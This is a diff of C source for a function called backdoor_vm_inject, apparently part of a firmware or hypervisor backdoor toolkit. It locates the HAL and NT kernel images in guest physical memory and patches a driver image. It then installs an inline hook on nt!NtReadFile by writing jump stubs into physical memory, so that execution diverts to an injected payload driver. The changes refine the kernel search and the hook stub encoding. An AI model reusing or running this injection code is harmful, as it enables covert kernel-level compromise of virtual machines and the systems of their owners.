@@ -1,7 +1,7 @@
 #include "stdafx.h"
 #include "vmcs.h"
 
-#define DRIVER_HOOK_SIZE 24
+#define DRIVER_HOOK_SIZE 22
 #define DRIVER_HOOK_SIZE_MAX 0x50
 
 #define PROCESSOR_START_BLOCK_ADDR 0x1000
@@ -86,17 +86,23 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
         printf("\n   CompletionFlag: 0x%.8x\n", info->CompletionFlag);
         printf("            Gdt32: 0x%.8x, limit = %.4x\n", info->Gdt32.Base, info->Gdt32.Limit);
         printf("            Idt32: 0x%.8x, limit = %.4x\n", info->Gdt32.Base, info->Gdt32.Limit);
-        printf(" hal!HalpLMStub(): 0x%llx\n", hal_lm_stub);
+        printf("     HalpLMStub(): 0x%llx\n", hal_lm_stub);
         printf("     PML4 address: 0x%llx\n\n", guest_pml4_addr);
+
+        printf("[+] Locating kernel image in memory, it might take a while...\n");
             
         uint64_t hal_base_virt = _ALIGN_DOWN(hal_lm_stub, PAGE_SIZE);
         uint64_t hal_base_phys = 0;
         uint32_t hal_size = 0;
 
+        uint64_t nt_base_virt = 0;
+        uint64_t nt_base_phys = 0;
+        uint32_t nt_size = 0;
+
         uint32_t hal_idata_addr = 0;
         uint32_t hal_idata_size = 0;
 
-        while (hal_lm_stub - hal_base_virt < PAGE_SIZE * 0x100)
+        while (hal_lm_stub - hal_base_virt < PAGE_SIZE * 0x500)
         {
             m_quiet = true;
 
@@ -126,26 +132,49 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
                 }
 
                 IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
-                    RVATOVA(buff, ((IMAGE_DOS_HEADER *)buff)->e_lfanew);
+                    RVATOVA(buff, ((IMAGE_DOS_HEADER *)buff)->e_lfanew); 
 
-                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
-                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
-
-                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
+                // check for the sane header
+                if (hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 && 
+                    hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE)
                 {
-                    if (!strncmp((char *)&sec->Name, ".idata", 6))
+                    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
+                        RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
+
+                    IMAGE_SECTION_HEADER *sec_curr = sec;
+
+                    // look for the PAGEKD section
+                    for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                     {
-                        hal_idata_addr = sec->VirtualAddress;
-                        hal_idata_size = sec->Misc.VirtualSize;
-                        break;
+                        if (!strncmp((char *)&sec_curr->Name, "PAGEKD", 6))
+                        {
+                            // HalpLMStub() points to the kernel image!
+                            nt_base_virt = hal_base_virt;
+                            goto _nt_found;
+                        }
+
+                        sec_curr += 1;
                     }
 
-                    sec += 1;
-                }
+                    sec_curr = sec;
 
-                hal_base_phys = phys_addr;
-                hal_size = hdr->OptionalHeader.SizeOfImage;
-                break;
+                    // look for the .idata section
+                    for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
+                    {
+                        if (!strncmp((char *)&sec_curr->Name, ".idata", 6))
+                        {
+                            hal_idata_addr = sec_curr->VirtualAddress;
+                            hal_idata_size = sec_curr->Misc.VirtualSize;
+                            break;
+                        }
+
+                        sec_curr += 1;
+                    }
+
+                    hal_base_phys = phys_addr;
+                    hal_size = hdr->OptionalHeader.SizeOfImage;
+                    break;
+                }                
             }            
 
             hal_base_virt -= PAGE_SIZE;
@@ -163,11 +192,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
             goto _end;
         }
 
-        printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_base_virt, hal_base_phys);
-
-        uint64_t nt_base_virt = 0;
-        uint64_t nt_base_phys = 0;
-        uint32_t nt_size = 0;
+        printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_base_virt, hal_base_phys);        
 
         hal_size = _ALIGN_UP(hal_size, PAGE_SIZE);
 
@@ -228,6 +253,8 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
             goto _end;
         }
 
+_nt_found:
+
         uint32_t ptr = 0;
         uint32_t nt_edata_addr = 0;
         uint32_t nt_edata_size = 0;
@@ -268,33 +295,38 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
                 IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
                     RVATOVA(buff, ((IMAGE_DOS_HEADER *)buff)->e_lfanew);
 
-                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
-                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
-
-                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
+                // check for the sane header
+                if (hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&
+                    hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE)
                 {
-                    if (!strncmp((char *)&sec->Name, ".edata", 6))
+                    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
+                        RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
+
+                    for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                     {
-                        nt_edata_addr = sec->VirtualAddress;
-                        nt_edata_size = sec->Misc.VirtualSize;
-                    }
-                    else if (!strncmp((char *)&sec->Name, "INIT", 4))
-                    {
-                        nt_init_addr = sec->VirtualAddress;
-                        nt_init_size = sec->Misc.VirtualSize;
-                    }
-                    else if (!strncmp((char *)&sec->Name, "PAGEKD", 6))
-                    {
-                        nt_pagekd_addr = sec->VirtualAddress;
-                        nt_pagekd_size = sec->Misc.VirtualSize;
+                        if (!strncmp((char *)&sec->Name, ".edata", 6))
+                        {
+                            nt_edata_addr = sec->VirtualAddress;
+                            nt_edata_size = sec->Misc.VirtualSize;
+                        }
+                        else if (!strncmp((char *)&sec->Name, "INIT", 4))
+                        {
+                            nt_init_addr = sec->VirtualAddress;
+                            nt_init_size = sec->Misc.VirtualSize;
+                        }
+                        else if (!strncmp((char *)&sec->Name, "PAGEKD", 6))
+                        {
+                            nt_pagekd_addr = sec->VirtualAddress;
+                            nt_pagekd_size = sec->Misc.VirtualSize;
+                        }
+
+                        sec += 1;
                     }
 
-                    sec += 1;
+                    nt_base_phys = phys_addr;
+                    nt_size = hdr->OptionalHeader.SizeOfImage;
+                    break;
                 }
-
-                nt_base_phys = phys_addr;
-                nt_size = hdr->OptionalHeader.SizeOfImage;
-                break;
             }            
 
             nt_base_virt -= PAGE_SIZE;
@@ -410,7 +442,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
         uint32_t driver_old_NtReadFile = 0;
 
         uint8_t nt_func_buff[DRIVER_HOOK_SIZE_MAX];
-        uint8_t nt_func_jump[DRIVER_HOOK_SIZE];
+        uint8_t nt_func_jump[DRIVER_HOOK_SIZE_MAX];
         uint32_t nt_func_saved_size = 0;
 
         printf("[+] Kernel driver virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, driver_size);
@@ -531,13 +563,10 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
 
             memcpy(driver_image + driver_old_NtReadFile, nt_func_buff, nt_func_saved_size);
 
-            // mov rax, addr
-            *(uint16_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size) = 0xb848;
-            *(uint64_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size + 2) = \
-                nt_func_virt + nt_func_saved_size;
-
-            // jmp rax ; from callgate to function
-            *(uint16_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size + 10) = 0xe0ff;
+            // jump from callgate to function
+            *(uint16_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size) = 0x25ff;
+            *(uint32_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size + 2) = 0;
+            *(uint64_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size + 6) = nt_func_virt + nt_func_saved_size;
 
             if ((saved_data = (uint8_t *)malloc(driver_size)) == NULL)
             {
@@ -598,20 +627,20 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
             goto _end;
         }
 
+        memset(nt_func_jump, 0x90, sizeof(nt_func_jump));
+
         // mov rax, cr3
-        *(uint32_t *)nt_func_jump =  0xd8200f90;
+        *(uint32_t *)nt_func_jump = 0xd8200f90;
 
         // mov cr3, rax
-        *(uint32_t *)(nt_func_jump + 4) =  0x90d8220f;
+        *(uint32_t *)(nt_func_jump + 4) = 0x90d8220f;
 
-        // mov rax, addr
-        *(uint16_t *)(nt_func_jump + 8) = 0xb848;
-        *(uint64_t *)(nt_func_jump + 10) = driver_base_virt + driver_new_NtReadFile;
+        // jump from function to handler
+        *(uint16_t *)(nt_func_jump + 8) = 0x25ff;
+        *(uint32_t *)(nt_func_jump + 10) = 0;
+        *(uint64_t *)(nt_func_jump + 14) = driver_base_virt + driver_new_NtReadFile;
 
-        // jmp rax ; from function to handler
-        *(uint16_t *)(nt_func_jump + 18) = 0xe0ff;   
-
-        if (backdoor_phys_write(nt_func_phys, nt_func_jump, DRIVER_HOOK_SIZE) != 0)
+        if (backdoor_phys_write(nt_func_phys, nt_func_jump, nt_func_saved_size) != 0)
         {
             goto _end;   
         }
@@ -622,6 +651,8 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
             "[+] nt!NtReadFile() hook was set: 0x%llx -> 0x%llx\n", 
             nt_func_virt, driver_base_virt + driver_new_NtReadFile
         );
+
+        printf("[+] Waiting for the driver to be executed...\n");
 
         while (true)
         {
@@ -664,7 +695,7 @@ int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_s
 
             m_quiet = false;  
 
-            // backup physical memory contents
+            // restore physical memory contents
             if (backdoor_phys_write(phys_addr, saved_data + i, PAGE_SIZE) != 0)
             {
                 goto _end;   
